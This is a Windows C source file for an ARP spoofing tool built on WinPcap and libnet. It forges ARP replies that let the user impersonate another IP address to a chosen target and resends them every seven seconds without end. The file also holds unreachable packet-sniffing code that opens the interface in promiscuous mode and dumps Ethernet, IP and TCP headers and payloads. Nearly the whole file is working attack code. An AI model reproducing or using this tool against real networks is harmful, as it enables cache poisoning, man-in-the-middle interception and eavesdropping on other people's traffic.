#define HAVE_REMOTE
#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "wpcap.lib")
#pragma comment (lib, "libnet.lib")
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <pcap.h>
#include "network.h"
#include <string.h>
#include <libnet.h>

void decode_ethernet(const u_char *header_in);
void decode_ip(const u_char *header_in);
u_int decode_tcp(const u_char *header_in);
void print_ip(u_int ip);
void init_arp();

struct libnet_ethernet_hdr ethernet_header;
struct libnet_arp_hdr arp_header;

void usage(char *argv[]){
	printf("Usage: %s [MAC]target [IP]target address [IP]address\n\n", argv[0]);
	printf("target - mac address of target\n");
	printf("target address - IP address of the target\n");
	printf("address - IP address of device you want to pretend to be\n");
}

int main(int argc, char *argv[]){
	pcap_if_t *alldevs;
	pcap_if_t *device;
	pcap_t *adhandle;
	int i = 0;
	int uchoice, res;
	char errbuf[PCAP_ERRBUF_SIZE];
	const u_char *pkt_data;
	struct pcap_pkthdr *pkt_header;
	int tcp_hdr_len, packet_data_length;
	int total_header_size;
	u_char *dataPortion;
	struct libnet_ether_addr *eh_addr;

	if(argc == 1){
		usage(argv);
		return 1;
	}

	if(pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1){
		printf("Error finding devices!: %s\n", errbuf);
		return -1;
	}

	for (device = alldevs; device; device = device->next){
		printf("%d. %s\n", i++, device->name);
		if(device->description)
			printf(" (%s)\n\n", device->description);
		else
			printf(" (No description)\n\n");
		
		if(i == 0){
			printf("No devices found!\n");
			return -1;
		}
		
	}
	printf("Enter the device you want to use, 1-%d: ", i);
	
	scanf_s("%d", &uchoice);

	if(uchoice < 1 || uchoice > i){
		printf("\nInvalid device!\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	//set the device to listen on
	for(device = alldevs, i = 0; i < uchoice-1; device = device->next, i++);

	if(argc == 4){
		char *destination;
		char *lib_device;
		char *new_device;
		libnet_t *l;
		char lib_errbuff[LIBNET_ERRBUF_SIZE];
		uint8_t enet_src[6], enet_dst[6], *packet;
		int values[6], c;
		uint32_t IP_address, target_IP_address, packet_s;
		libnet_ptag_t tag_ether, tag_arp;
		unsigned int c1, c2, c3, c4;

		destination = argv[1];
		lib_device = (char *)device->name;
		new_device = lib_device + 8; // Remove "rpcap" from name
		init_arp();


		l = libnet_init(LIBNET_LINK_ADV, new_device, lib_errbuff);

		// The local devices' mac and IPV4 address
		eh_addr = libnet_get_hwaddr(l);

		printf("From device: ");
		for(i = 0; i < 6; i++){ // Fill and print enet_src with the mac address
			enet_src[i] = eh_addr->ether_addr_octet[i];
			printf("%02x", enet_src[i]);
			if(i != 5)
				printf(":");
		}
		printf("\n");


		// Convert target IP address to unsigned long (uint32_t)
		sscanf_s(argv[3], "%d.%d.%d.%d", &c1, &c2, &c3, &c4);
		IP_address = (uint32_t)c1 + c2*256 + c3*256*256 + c4*256*256*256;

		c1 = c2 = c3 = c4 = 0; //NULL these out before using them again

		// Convert the 2nd IP address to unsigned long (uint23_t)
		sscanf_s(argv[2], "%d.%d.%d.%d", &c1, &c2, &c3, &c4);
		target_IP_address = (uint32_t)c1 + c2*256 + c3*256*256 + c4 * 256*256*256;


		printf("Target: ");
		// Set the target mac address
		if( 6 == sscanf_s(destination, "%x:%x:%x:%x:%x:%x%c", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])){ // %c is for removing text that doesn't belong
		for( i = 0; i < 6; ++i ){// Fill and print enet_dst with the mac address the user provided
			enet_dst[i] = (uint8_t) values[i];
			printf("%02x", enet_dst[i]);
			if(i != 5)
				printf(":");
			}
		}else{
			printf("\nInvalid mac address format");
		}

		// Have to build arp first, then ethernet

		tag_arp = libnet_build_arp(
			arp_header.ar_hrd,				// Type is ethernet
			arp_header.ar_pro,				// Protocol is IPV4
			arp_header.ar_hln,				// Size of mac address (6 bytes)
			arp_header.ar_pln,				// Size of IPV4 address (4 bytes)
			arp_header.ar_op,				// Operation type, we're sending a reply
			enet_src,						// This address gets set to the mac address of the next ip address on the victims machine (sender hardware address)
			(uint8_t *)&IP_address,			// The ip address of the device we want to pretend to be (sender protocol address)
			enet_dst,						// The mac address of the device we're relpying to (target hardware address)
			(uint8_t *)&target_IP_address,	// The ip address of the device we're replying to (target protocol address)
			NULL,							// No payload
			0,								// Size of payload is 0
			l,								// The handle for libnet to use
			0								// Create a new ptag
			 );
		if(tag_arp == -1){
			printf("\n\nError creating arp header: %s", libnet_geterror(l));
			return -1;
		}
		printf("\n\nSuccessfully built arp header!\n");

		// TODO: tag_ether may be redundant
		tag_ether = libnet_build_ethernet(enet_dst, enet_src, ethernet_header.ether_type, NULL, 0, l, 0);
		if(tag_ether == -1){
			printf("Error creating ethernet header: %s\n", libnet_geterror(l));
			return -1;
		}
		printf("Successfully built ethernet header!\n");

		// Call to build the packet
		if(libnet_adv_cull_packet(l, &packet, &packet_s) == -1){
			printf("Error creating packet: %s\n", libnet_geterror(l));
			return -1;
		}
		printf("Created a %d byte packet\n", packet_s);

		// Continue to send the same arp packet every 7 seconds

		printf("Starting loop\n\n");
		while(1){
		c = libnet_write(l);
		if(c == -1){
			printf("Error writing packet: %s\n", libnet_geterror(l));
			libnet_destroy(l);
			return -1;
		}

		printf("Success! Wrote a %d byte packet\n", c);
		Sleep(7000);
		}

		return 1;
	}// end of "if"
	else{
		usage(argv);
		return 1;
	}
	


	
	// This code in unreachable on purpose




	// Open device in promiscuous mode to sniff all packets on the network
	if((adhandle = pcap_open(device->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf)) == NULL){
		printf("Error assigning device!: %s", errbuf);
		return -1;
	}

	// Don't need the list of devices anymore, free it from memory
	pcap_freealldevs(alldevs);

	//Decode the packets and print them
	while(res = pcap_next_ex(adhandle, &pkt_header, &pkt_data) >= 0){
		printf("\n\nReceived a %d byte packet\n", pkt_header->len);
		decode_ethernet(pkt_data);
		decode_ip(pkt_data+ETHER_HDR_LEN);
		tcp_hdr_len = decode_tcp(pkt_data+ETHER_HDR_LEN+sizeof(struct ip_hdr));
		total_header_size = ETHER_HDR_LEN + sizeof(struct ip_hdr) + tcp_hdr_len;
		dataPortion = (u_char *)pkt_data + total_header_size;
		packet_data_length = pkt_header->len - total_header_size;

		if(packet_data_length > 0){
		printf("============ %u bytes of packet data ============\n", packet_data_length);
		dump(dataPortion, packet_data_length);
		}else{
			printf("============ No packet data ============\n");
		}
	}
	
	return 1;
}

void decode_ethernet(const u_char *header_in){
	int i;
	int type;
	const struct ether_hdr *ethernet_header;

	printf("[Ethernet layer]\n");
	ethernet_header = (const struct ether_hdr *)header_in;
	type = ethernet_header->ether_type;
	if(type == ETH_ARP)
		printf("Type: ARP  ");
	else if(type == ETH_IPV4)
		printf("Type: IPV4  ");
	else if(type == ETH_IPV6)
		printf("Type: IPV6  ");
	// Print source mac address
	printf("%02x", ethernet_header->ether_src_addr[0]);
	for(i = 1; i != ETHER_ADDR_LEN; i++)
		printf(":%02x", ethernet_header->ether_src_addr[i]);

	// Print destination mac address
	printf("  -->  %02x", ethernet_header->ether_dest_addr[0]);
	for (i = 1; i != ETHER_ADDR_LEN; i++){
		printf(":%02x", ethernet_header->ether_dest_addr[i]);
		if(i == ETHER_ADDR_LEN -1)
			printf("\n");
	}
}

void decode_ip(const u_char *header_in){
	struct ip_hdr *ip_header;

	ip_header = (struct ip_hdr *)header_in;

	printf("\t[IP Layer]\n\t");
	print_ip(ip_header->ip_src_addr);
	printf("  -->  ");
	print_ip(ip_header->ip_dest_addr);
	printf("\n");

}

u_int decode_tcp(const u_char *header_in){
	const struct tcp_hdr *tcp_header;
	int header_size;


	tcp_header = (const struct tcp_hdr *)header_in;
	header_size = 4 * tcp_header->tcp_offset;
	printf("\t\t[TCP layer]\n");
	printf("\t\tPort: %hu  -->  %hu\n", ntohs(tcp_header->tcp_src_port), ntohs(tcp_header->tcp_dest_port));
	printf("\t\tAck #%u  Flags: ", ntohl(tcp_header->tcp_ack));
	if(tcp_header->tcp_flags & TCP_FIN)
		printf("FIN ");
	if(tcp_header->tcp_flags & TCP_SYN)
		printf("SYN ");
	if(tcp_header->tcp_flags & TCP_RST)
		printf("RST ");
	if(tcp_header->tcp_flags & TCP_PUSH)
		printf("PUSH ");
	if(tcp_header->tcp_flags & TCP_ACK)
		printf("ACK ");
	if(tcp_header->tcp_flags & TCP_URG)
		printf("URG");

		printf("\n");

	return header_size;
}

void init_arp(){
	ethernet_header.ether_type = ETH_ARP;			// We're making an arp packet
	//memset(ethernet_header.ether_dhost, 0xFF, 6);	// Just so it has a value, will be changed later
	//memset(ethernet_header.ether_shost, 0, 6);		// Same for this one

	arp_header.ar_op = ARPOP_REPLY;				// We're sending an arp reply
	arp_header.ar_hln = 6;						// A MAC address takes 6 bytes
	arp_header.ar_pln = 4;						// Length of the IP protocol address is 4 bytes
	arp_header.ar_hrd = ARPHRD_ETHER;			// We will be sending this packet from Ethernet
	arp_header.ar_pro = ETHERTYPE_IP;			// We're sending this on IPV4
}

void print_ip(u_int ip){ // Only works on little-endian
	int i;
	unsigned int ipAddress = ip;
    unsigned char octet[4] = {0,0,0,0};
    for (i=0; i<4; i++){
    octet[i] = ( ipAddress >> (i*8) ) & 0xFF;
    }
    printf("%d.%d.%d.%d",octet[0],octet[1],octet[2],octet[3]);
}